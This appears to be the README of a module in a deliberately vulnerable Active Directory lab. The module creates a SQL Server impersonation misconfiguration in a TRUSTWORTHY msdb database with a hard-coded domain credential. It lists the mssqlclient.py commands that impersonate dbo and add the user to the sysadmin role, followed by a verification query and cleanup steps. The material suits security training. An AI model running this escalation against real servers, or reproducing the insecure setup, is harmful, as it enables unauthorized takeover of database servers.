# mssql-impersonate-user

Creates domain user `scn-sql-dbo` (password `Aa1234567890!`), a login and a user for it in `msdb`, and `GRANT IMPERSONATE ON USER::[dbo]` in `msdb`. `msdb` is `TRUSTWORTHY` and owned by `sa`, so `dbo` there reaches sysadmin.

Attack:

    mssqlclient.py -windows-auth <domain>/scn-sql-dbo:'Aa1234567890!'@<host ip>
    SQL> use msdb
    SQL> exec_as_user dbo
    SQL> EXEC sp_addsrvrolemember 'SEVENKINGDOMS\scn-sql-dbo', 'sysadmin'   # through the trustworthy database

How to verify:

    USE msdb; SELECT g.name, p.permission_name FROM sys.database_permissions p JOIN sys.database_principals g ON p.grantee_principal_id = g.principal_id WHERE p.permission_name = 'IMPERSONATE'

Disable drops the `msdb` user and the login and resets `xp_cmdshell` and `show advanced options` to `0` (Base values), and deletes the domain user. Not cleaned: server roles the attacker granted to other logins.
